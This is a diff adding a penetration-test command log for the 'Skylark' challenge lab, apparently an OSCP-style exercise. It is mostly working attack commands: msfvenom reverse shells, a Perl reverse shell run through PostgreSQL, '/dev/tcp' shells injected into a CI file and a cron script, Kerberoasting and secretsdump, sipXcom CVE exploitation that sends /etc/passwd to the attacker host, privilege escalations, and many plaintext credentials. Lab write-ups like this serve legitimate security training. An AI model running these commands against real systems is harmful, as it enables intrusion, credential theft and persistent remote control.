@@ -2127,3 +2127,367 @@ proxychains -q nxc smb 172.16.146.6 -u Administrator -p "vau\!XCKjNQBv2$" -x "<p
 
 
 ```
+
+
+
+Skylark:
+```
+Commands used during the compromise of Skylark
+
+crackmapexec smb external.txt -u "" -p ""
+crackmapexec smb external.txt -u anonymous -p ""
+
+sudo masscan -p1-65535,U1:65535 -iL external.txt  --rate=1000 -e tun0 | tee reporting/ExternalMasscan.txt
+
+sudo ./scan.py		--> (sudo nmap -sV -sC -Pn -p {ports} {ip}) for each ip
+
+.223
+	gobuster dir -u "http://192.168.178.223:60001/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+	feroxbuster -u "http://192.168.153.223:60001/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --filter-status 404,400
+	sudo echo "192.168.153.223 milan" >> /etc/hosts
+	searchsploit osCommerce 2.3.4.1
+	searchsploit -m php/webapps/50128.py
+	python3 50128.py http://192.168.153.223:60001/catalog/
+	msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.213 LPORT=80 -f elf -o rev_80.bin
+	sudo python3 -m http.server 80
+	wget -O /tmp/rev_80.bin http://192.168.45.213/rev_80.bin
+	/tmp/rev_80.bin
+	[stable shell access is gained to 192.168.153.223 as www-data]
+		/usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
+		wget -O linpeas.sh http://192.168.45.213:443/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh | tee WWW_LINPEAS_223.txt
+		[file transfers done over SSH]
+		ssh -N -R 127.0.0.1:3306:127.0.0.1:3306 kali@192.168.45.213
+		ssh -N -R 127.0.0.1:60005:127.0.0.1:60002 kali@192.168.45.213
+			mysql -h 127.0.0.1 -u oscuser -p oscdb --ssl-pass		--> password is 7NVLVTDGJ38HM2TQ
+		select database();
+		show tables;
+		select * from administrators;				--> admin : $P$DVNsEBdq7PQdr7GR65xbL0pas6caWx0
+		update administrators set user_password = '$P$5wertwetrISBk97lP0pv3FCxM1DbWR.' where user_name = 'admin';		--> PHPass of password made using https://asecuritysite.com/hash/phpass
+		[admin access to 60001 is gained via http://milan:60001/catalog/admin/index.php]
+		mysql -h 127.0.0.1 -u root -p froxlor --skip-ssl
+			use froxlor
+			show tables;
+			select * from ftp_users;
+				python2 -c 'import crypt; print crypt.crypt("password", "$5$egSnwzfaBdlswnAz")'
+			INSERT INTO ftp_users (username, password) VALUES ('added_user', '$5$egSnwzfaBdlswnAz$7EjvBjhnqXAaex8oXhCbLDgFFwsiji0mIO2cW.ykxY9');		--> added_user : password
+			select * from panel_admins
+			INSERT INTO panel_admins (adminid, loginname, password, name, email) VALUES (2, 'added_user', '$5$egSnwzfaBdlswnAz$7EjvBjhnqXAaex8oXhCbLDgFFwsiji0mIO2cW.ykxY9', 'added_user', 'added_user@milan');	
+			[login at http://127.0.0.1:60005/index.php]
+			searchsploit froxlor
+			searchsploit -m php/webapps/50502.txt
+			select * from panel_customers;			--> hashes dumped --> sarah : Christopher
+			[login at http://127.0.0.1:60005/index.php as sarah]
+			insert into panel_admins (loginname,password,customers_see_all,domains_see_all,caneditphpsettings,change_serversettings) values ('x','$5$ccd0bcdd9ab970b1$Hx/a0W8QHwTisNoa1lYCY4s3goJeh.YCQ3hWqH1ZUr8',1,1,1,1);
+			[login as x:a to froxlor admin panel] (this privesc is based on php/webapps/50502.txt)
+			system settings > webserver settings > webserver reload command > "wget http://192.168.45.213:443/rev_80.bin -O /rev.bin" > rebuild config files > yes
+			system settings > webserver settings > webserver reload command > "chmod 777 /rev.bin" > rebuild config files > yes
+			system settings > webserver settings > webserver reload command > "../../../../../../../../../../rev.bin" > rebuild config files > yes
+
+gobuster dir -u "http://192.168.153.226:24680/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+gospider -s http://192.168.153.226:24680/ -t 10 -d 3 --sitemap --robots
+
+feroxbuster -u "http://192.168.153.225:80/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --filter-status 404,400
+feroxbuster -u "http://192.168.153.225:8090/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --filter-status 404,400
+gobuster dir -u "http://192.168.153.225:8090/backend/default" -x ,.txt,.php,.aspx,.as -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+.225
+	[login at http://192.168.153.225:8090/backend/default/index.php with admin : admin as nginx default credentials]
+	[upload pentest monkey php reverse shell for port 80 with %PDF-1.3 as the magic number to bypass the server side check]
+	[browse to http://192.168.153.225:8090/backend/default/uploads/rev.php to trigger the shell]
+	/usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
+	wget -O linpeas.sh http://192.168.45.213:443/linpeas.sh
+	chmod +x linpeas.sh
+	./linpeas.sh | tee WWW_LINPEAS_225.txt
+	ssh -N -R 127.0.0.1:5432:127.0.0.1:5432 kali@192.168.45.213
+	psql -h 127.0.0.1 -p 5432 -U postgres
+	\c webapp
+	\d
+	\d users
+	scp /var/www/backend/default/uploads/user-guide-rdweb.pdf kali@192.168.45.213:/home/kali/ChallengeLabs/Skylark/225_files/
+	[SKYLARK\kiosk : XEwUS^9R2Gwt8O914 is uncovered]
+	psql -h 127.0.0.1 -p 5432 -U postgres
+	CREATE TABLE cmd_exec(cmd_output text);
+	COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.45.213:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
+	SELECT * FROM cmd_exec;
+	[access is gained as postgres]
+	/usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
+	sudo -l				--> psql can be run by postgres with root privileges
+	sudo /usr/bin/psql -h 127.0.0.1 -p 5432 -U postgres
+	\?
+		!/bin/sh
+	[shell access is gained as root]
+	/usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+
+.221:
+	[login at https://192.168.153.221/RDWeb with kiosk : XEwUS^9R2Gwt8O914]
+	[SkylarkStatus > Download RDP package]
+	crackmapexec smb ../external.txt -u "kiosk" -p "XEwUS^9R2Gwt8O914"
+	crackmapexec smb ../external.txt -u "kiosk" -p "XEwUS^9R2Gwt8O914" --shares
+	smbclient //192.168.153.221/Users -U SKYLARK.com\\kiosk
+	xfreerdp /v:192.168.153.221 /d:skylark.com /port:10000 /u:kiosk /p:"XEwUS^9R2Gwt8O914"		--> should work but does not
+	xfreerdp Skylark_RDP.rdp /u:kiosk /p:XEwUS^9R2Gwt8O914 /d:skylark.com				--> works once /etc/hosts contains AUSTIN02.SKYLARK.COM
+	[access is gained to the SKYLARK machine access tool]
+	machine access tool GUI > AUSTIN02 button > file manager on .221
+		msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.213 LPORT=80 -f exe -o rev_80.exe
+		sudo impacket-smbserver -user kiosk -password "XEwUS^9R2Gwt8O914" -smb2support share .
+	[browse to \\192.168.45.213\share in the opened file manager and run rev_80.exe]
+	[shell access is gained to .221 as kiosk]
+	net user /domain
+	iwr -uri http://192.168.45.213:443/winPEASx64.exe -o winpeas.exe
+		copy \\192.168.45.213\share\rev_80.exe .\
+		START /B rev_80.exe
+	.\winpeas.exe log=WINPEAS_KIOSK_221.txt
+	.\chisel client 192.168.45.213:8085 R:socks
+	proxychains -q impacket-GetUserSPNs -request -dc-ip 10.10.113.250 SKYLARK.com/kiosk:"XEwUS^9R2Gwt8O914"
+	hashcat -m 13100 backup_service_kerberoastable.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule 		--> reveals backup_service : It4Server
+	[domain admin is achieved by kerberoasting backup_service]
+	evil-winrm -i 192.168.153.221 -u backup_service -p "It4Server"
+		[administrative shell access is gained to .221 as backup_service]
+		Get-ChildItem -Path C:\ -Include local.txt,proof.txt -File -Recurse -ErrorAction SilentlyContinue
+	net user added_user Password1# /add
+	net localgroup "Administrators" added_user /add
+	net localgroup "Remote Desktop Users" added_user /add
+	[C:\Program Files\uvnc bvba\UltraVNC\ultravnc.ini is retrieved]
+proxychains -q crackmapexec smb ../internal.txt -u backup_service -p "It4Server"
+for ip in $(cat admin_accessible.txt); do proxychains -q impacket-psexec skylark.com/backup_service:"It4Server"@$ip;done
+	where /R C:\ local.txt
+	where /R C:\ proof.txt
+
+impacket-secretsdump backup_service:It4Server@192.168.153.221 | tee 221_SECRETSDUMP.txt
+proxychains -q impacket-secretsdump backup_service:"It4Server"@10.10.113.250 | tee DC_250_SECRETSDUMP.txt
+hashcat -m 1000 domain/domain_hashes.hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+proxychains -q crackmapexec smb ../../internal.txt -u backup_service -p "It4Server" --shares
+proxychains -q smbmap -H 10.10.113.11 -u backup_service -p It4Server -d skylark.com
+[\\10.10.113.11\backup was accessed graphically via 192.168.153.221 (using backup_service) and ftp and partner portal credentials were recovered]
+
+[192.168.153.226:24621 was accessed using ftp_jp : ~be<3@6fe1Z:2e8]
+ftp 192.168.153.226 24621
+	more security.txt
+		sudo echo "192.168.153.226 skylark.jp" >> /etc/hosts
+		msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.213 LPORT=80 -f aspx -o rev_80.aspx
+	put rev_80.aspx /rev_80.aspx
+	[browse to http://skylark.jp/rev_80.aspx]
+	[shell access is gained to .226 as defaultapppool]
+	whoami /priv
+	[SeImpersonatePrivilege is not vulnerable]
+	[winpeas.exe is downloaded and run]
+	[PowerUp.ps1 is downloaded and run]
+	sc qc DevService
+		x86_64-w64-mingw32-gcc mal_service.c -o Development.exe
+	copy "\\192.168.45.213\share\Development.exe" "C:\Skylark\Development.exe"
+	sc start DevService
+	[SYSTEM access is gained to .226]
+	Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
+	reg save hklm\sam c:\sam
+	reg save hklm\system c:\system
+	reg save hklm\security c:\security
+	impacket-secretsdump -sam sam -system system -security security local
+	Set-WinSystemLocale en-US
+	Set-WinUserLanguageList en-US
+	[C:\Users\j_local\Desktop\Passwords.kdbx was exfiltrated]
+		hashcat -m 13400 crack.keepass2 /usr/share/wordlists/fasttrack.txt  -r /usr/share/hashcat/rules/best64.rule		--> P@ssword!
+		keepass2 Passwords.kdbx
+
+sudo proxychains -q nmap -sV -sC -Pn --top-ports 10 -iL 10_internal.txt| tee first_internal_script_scan.txt
+proxychains -q crackmapexec smb internal.txt -u helpdesk_setup -p "Tuna6Helper" --shares
+curl --proxy http://ext_acc:"DoNotShare\!SkyLarkLegacyInternal2008"@192.168.228.224:3128 http://192.168.228.224:8000/			--> proxy access granted
+
+looting tftp on .222
+	sudo nmap -n -Pn -sU -p69 -sV --script tftp-enum 192.168.228.222			--> shows backup.cfg, sip-confg, sip.cfg, sip_327.cfg
+	msfconsole:
+		use admin/tftp/tftp_transfer_util
+		set remote_filename backup.cfg
+		set remote_filename XXXX.cfg
+		set remote_filename XXXX.cfg
+		set remote_filename XXXX.cfg
+
+proxychains -q crackmapexec smb 10.10.188.250 -u Administrator -H 55375d3c25c50db8a6064014f092646d -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
+[local graphical admin access is gained to the domain controller via RDP using the administrator hash]
+
+.250
+	type C:\\credentials.txt		--> reveals "Local Admin Passwords: PARIS: MusingExtraCounty98 and SYDNEY: DowntownAbbey1923"
+
+.222
+	crackmapexec smb 192.168.228.222 -u Administrator -p "MusingExtraCounty98"
+	impacket-psexec Administrator:"MusingExtraCounty98"@192.168.228.222
+	[post-exploitation grabbed the configuration files from the TFTPD server]		--> this revealed "reynolds : bj1ZzWEmJd870YHMsV+NdfsTuce+zsQRyvb7e5fIgY8="
+
+.227
+	nxc rdp 192.168.228.227 -u Administrator -p "DowntownAbbey1923"
+
+sudo proxychains -q nmap -sT --open -Pn --top-ports 30 10.10.188.12
+sudo proxychains -q nmap -sT --open -Pn --top-ports 50 10.10.188.10
+sudo proxychains -q nmap -sT --open -Pn --top-ports 30 -iL 20_internal.txt
+
+[10.10.188.13 is setup as the pivot into the 10.20.XX.XX subnet]
+proxychains -q crackmapexec smb 20_internal.txt -u backup_service -p "It4Server"
+proxychains -q nxc rdp 20_internal.txt -u backup_service -p "It4Server"
+proxychains -q crackmapexec smb 20_internal.txt -u backup_service -p "It4Server" -x "<psencoded-rev-shell>"
+	net group "remote desktop users" backup_service /add /domain
+	Get-ChildItem -Path C:\ -Include local.txt,proof.txt -File -Recurse -ErrorAction SilentlyContinue
+	net user added_user Password1# /add & net localgroup administrators added_user /add & net localgroup "remote desktop users" added_user /add
+proxychains -q nxc smb 20_internal.txt -u backup_service -p "It4Server" --shares
+
+.15
+	proxychains -q impacket-psexec Skylark.com/Administrator@10.20.188.15 -hashes :55375d3c25c50db8a6064014f092646d			--> this is domain admin, not local admin
+	git log
+	git config --global --add safe.directory C:/inetpub/wwwroot/SkylarkPartnerPortal
+	git log
+	git show c6bf001b02514f865f872996d20dc89da7b26287			--> each git commit was investigated for credentials
+	[skylark partner portal credentials and MSSQL credentials are recovered]
+	netstat -ant
+	proxychains -q impacket-mssqlclient sa:FrogColossusMad1@10.20.188.15
+
+sudo proxychains -q nmap -sT --open -Pn -p 21 10.20.188.14
+proxychains -q impacket-mssqlclient -port 65307 sa:FrogColossusMad1@10.20.188.15
+	SELECT name FROM master.dbo.sysdatabases;
+	SELECT * FROM master.INFORMATION_SCHEMA.TABLES;
+
+.220 post exploitation 				(recovery and decryption of VNC passwords)
+	irb		(try in msfconsole if this does not work)
+		fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
+		require 'rex/proto/rfb'
+		Rex::Proto::RFB::Cipher.decrypt ["<ENCRYPTED-VNC-PASSWORD>"].pack('H*'), fixedkey			--> this reveals the plaintext vnc password; use vncviewer without a password file
+	
+.10:
+	proxychains -q vncviewer 10.10.146.10::5901		--> password is "R3S3+rcH"
+	[graphical access is gained to RESEARCH via vnc]
+	sudo -l
+	curl http://192.168.45.213:443/linpeas.sh | sh | tee RESEARCH_LINPEAS_10.txt
+	sudo ip netns add foo
+	sudo ip netns exec foo /bin/sh
+	[root access is gained to .10 via sudo ip privilege escalation]
+		ssh-keygen
+		echo <pub-key-fingerprint> >> /root/.ssh/authorized_keys
+		proxychains -q ssh -i secret root@10.10.146.10
+	[linpeas is run as root and results are exfiled using scp]
+	python3 -c 'import pty; pty.spawn("/bin/bash")'
+	cd /home/research/scratchpad
+	git log
+	git show <each commit>
+	[/etc/passwd and /etc/shadow are exfiled over scp]
+	unshadow passwd shadow >> unshadowed.txt
+	john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt				--> this reveals development password
+	cat /home/research/Utils.ipynb | grep token						--> private_token='glpat-PzrxBe-5Js7c3t7hoq4X'\n\",
+	[browse to http://localhost:8888]
+	jupyter notebook list									--> this shows the research token for local jupyter notebook instance
+	inject "bash -i >& /dev/tcp/192.168.45.213/80 0>&1" into .gitlab-ci.yml
+	git add .gitlab-ci.yml
+	git commit -m "testing"
+	git push origin main
+
+.14
+	[shell access is gained to .14 via modified .yml file committed from .10]
+	cat /etc/crontab
+	cat /opt/fs_checks/fs.sh
+		this cronjob imports /opt/u/__fs.sh (writable)
+	[/opt/u/__fs.sh is copied over to kali and modified]						--> "bash -i >& /dev/tcp/192.168.45.213/80 0>&1" at the start of every function
+	scp kali@192.168.45.213:/home/kali/ChallengeLabs/Skylark/14_files/__fs.sh /opt/u/__fs.sh
+	[wait 5 minutes for cronjob to run]
+	[shell root access is gained]
+	echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC992gvnxufVrCSliPOC5hQqtErF125tJJpjHpNP/P7X kali@kali" >> /root/.ssh/authorized_keys			--> "secret" key
+
+.15
+	powershell.exe -Command 'Set-ItemProperty -Path \"HKLM:\System\CurrentControlSet\Control\Terminal Server\" -Name \"fDenyTSConnections\" -Value 0'
+	powershell.exe -Command 'Set-ItemProperty -Path \"HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\" -Name \"UserAuthentication\" -Value 1'
+	[admin : Complex__1__Password! are recovered when looting the C:\inetpub directory; a note left indicates they are for the file manager at 8080 on .12]
+
+.12
+	[login at http://10.10.146.12:8080/]
+	http://10.10.146.12:8080/files/file2		--> 4 sets of credentials are recovered
+	settings > global settings > execute on shell > "bash -c" > toggle shell "<>" > "bash -i >& /dev/tcp/192.168.45.213/80 0>&1"
+	[shell access is gained to .12 as archive]
+	python3 -c 'import pty; pty.spawn("/bin/bash");'
+	curl http://192.168.45.213:443/linpeas.sh | sh | tee ARCHIVE_LINPEAS_12.txt
+	[pspy64 is downloaded and run]
+	UID=0 is running "socat - UNIX-CONNECT:/tmp/s"
+	rm -f /tmp/s
+	socat - UNIX-LISTEN:/tmp/s				--> root : BreakfastVikings99
+	[root access is gained to .12 because root authenticates itself to the listening socket]
+
+curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py
+python2 get-pip.py
+
+[192.168.240.224:3128 is used as a proxy into the 172.16.XX.XX subnet]
+sudo proxychains -q nmap -sT --open -Pn --top-ports 15 172.16.186.30-32
+[the following commands are executed in a WinRM session on .15 to enable RDP remotely and verify the credentials to be used for SipX]
+	Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
+	Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 1
+[valid sipXcom credentials are as follows:]
+	[l.nguyen : ChangeMePlease__XMPPTest]
+	[j.jameson : ChangeMePlease__XMPPTest]
+	[j.jones : ChangeMePlease__XMPPTest]
+	[superadmin : 2008_EndlessConversation]
+
+.32
+
+[Steps to exploit SipXcom]:
+
+1. confirming the vulnerability (retrieving /etc/passwd):
+[copy the webserver from https://gist.github.com/mdonkers/63e115cc0c79b4f6b8b3a6b797e485c7]
+python3 ~/WebServerWithPOSTSupport.py 443
+git clone https://github.com/glefait/CVE-2023-25355-25356.git
+poetry install
+proxychains -q poetry shell
+cve_2023_25355 --xmpp-username l.nguyen --xmpp-password ChangeMePlease__XMPPTest --xmpp-target-username j.jameson --xmpp-server-address 172.16.240.32 --payload '--data-binary @/etc/passwd http://192.168.45.213:443/some-path'
+[/etc/passwd is successfully read from the server]
+
+2. retreiving the chat logs to reveal the superadmin password
+cve_2023_25355 --xmpp-username l.nguyen --xmpp-password ChangeMePlease__XMPPTest --xmpp-target-username j.jameson --xmpp-server-address 172.16.240.32 --payload '--data-binary @/opt/openfire/logs/sipxopenfire-im.log http://192.168.45.213:443/some-path'
+[superadmin credentials are revealed to be superadmin : 2008_EndlessConversation by retrieving the chat logs]
+
+3. replacing the openfire configuration file with a modified file that includes a bash reverse shell
+git clone https://github.com/AlexLinov/sipXcom-RCE.git
+proxychains -q ./CVE-2023-25355-25356.py --username superadmin --password 2008_EndlessConversation --target_jid j.jameson --server_address 172.16.240.32 --payload_option 2 --file openfire.txt --attack_ip 192.168.45.213 --port 81
+
+4. using the superadmin credentials to reload the server with the modified config file
+sipxcom_service_restart --sipxcom-superuser-username superadmin --sipxcom-superuser-password 2008_EndlessConversation --sipxcom-website https://172.16.240.32/ --debug-local-directory /tmp
+
+[shell access is gained to .32 as the root user]
+	[linpeas.sh is downloaded and run]
+	tcpdump -vv -i ens192 | grep -E 'ass|oot|ser'
+		tcpdump -vv -i ens192 port 514 				--> reveals terminal root: desktop:Deskt0pTermin4L	(/root/.scripts/logger.sh cronjob)	(sniffing incoming syslog traffic on port 514)
+		netstat -tunlp
+		ss -tunlp
+
+proxychains -q ssh desktop@172.16.240.30
+	[shell access is gained to .30 via SSH as the desktop user (Deskt0pTermin4L)]
+	find / -type f -perm -u=s 2>/dev/null			--> /sbin/capsh is an SUID binary
+	/sbin/capsh --gid=0 --uid=0 --
+	[root access is gained to .30]
+	cat /home/legacy/.bash_history				--> reveals "I_Miss_Windows3.1"
+	find / -wholename *.vnc/* 2>/dev/null
+	[/home/desktop/.vnc/sesman_desktop_passwd:11 and /home/terminal/.vnc/sesman_terminal_passwd:10 VNC password files are found]
+	
+.224
+	ssh legacy@192.168.220.224			--> legacy : I_Miss_Windows3.1
+	[ssh access is gained as legacy]
+	python3 -c 'import pty; pty.spawn("/bin/bash")'
+	getcap -r / 2>/dev/null				--> reveals that vim (.basic and .tiny) have "cap_setuid +ep" capabilities
+	/usr/bin/vim.basic -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+	[root access is gained to .224 by abusing the capabilities assigned to vim.basic]
+	apt install nmap					--> nc was not sufficient for a full port scan on .31
+	nmap -v -sS -p- -Pn 172.16.220.31 | tee full_tcp_scan.txt		--> 22,25,79,2323
+	nmap -sS -sV -sC -p 22,25,79,2323 -Pn 172.16.220.31
+	nc -nv 172.16.220.31 2323						--> shows Connected to the VAX 11/780 simulator DZ device, line 0
+
+[googling "vax 11/780 simulator dz device exploit" shows that this service is vulnerable to the Morris worm exploit and that there is a suitable Metasploit module]
+	[https://www.rapid7.com/blog/post/2019/01/02/the-ghost-of-exploits-past-a-deep-dive-into-the-morris-worm/]
+proxychains -q msfconsole -q
+	search VAX
+	use bsd/finger/morris_fingerd_bof
+	[options are configured]
+	run
+.31
+[shell access is gained to .31]
+	/usr/ucb/whoami
+	/bin/sh -i			--> interactive sh gained
+	cat /etc/passwd
+		hashcat -m 1500 ingres_DES_hash.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule		--> ingres : Isengard
+	proxychains -q nc -nv 172.16.220.31 2323
+		help
+		["root" is entered when prompted for the password]
+	[root access is gained to .31]
+
+```
